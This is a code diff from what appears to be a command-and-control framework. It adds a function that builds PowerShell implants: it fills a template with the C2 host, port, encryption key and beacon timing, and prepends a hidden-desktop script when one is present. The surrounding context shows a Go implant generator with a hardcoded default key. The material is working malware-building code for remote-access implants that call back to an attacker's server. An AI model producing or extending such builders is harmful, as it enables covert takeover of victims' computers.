@@ -1401,6 +1401,24 @@ def {cmd_func}(cmd):
             template_path = self.templates_dir / "agent_http_template.ps1"
         else:
             template_path = self.templates_dir / "agent_template.ps1"
+        if not template_path.exists():
+            raise FileNotFoundError(f"Template not found: {template_path}")
+        content = template_path.read_text()
+        hd_ps = self.templates_dir / 'hidden_desktop.ps1'
+        if hd_ps.exists():
+            content = hd_ps.read_text() + '\n' + content
+        content = content.replace("{{C2_HOST}}", connect_host)
+        content = content.replace("{{C2_PORT}}", str(connect_port))
+        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
+        if transport in ('http', 'https'):
+            content = content.replace("{{C2_SCHEME}}", transport)
+            content = content.replace("{{VERIFY_SSL}}", "false" if transport == 'https' else "true")
+            content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
+            content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))
+        output_file = self.output_dir / f"agent_{self.random_string(6)}_{transport}.ps1"
+        output_file.write_text(content)
+        return str(output_file)
+
     def generate_go_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                            transport: str = 'http', beacon_interval: int = 60, beacon_jitter: int = 0,
                            target_os: str = 'windows', target_arch: str = 'amd64',
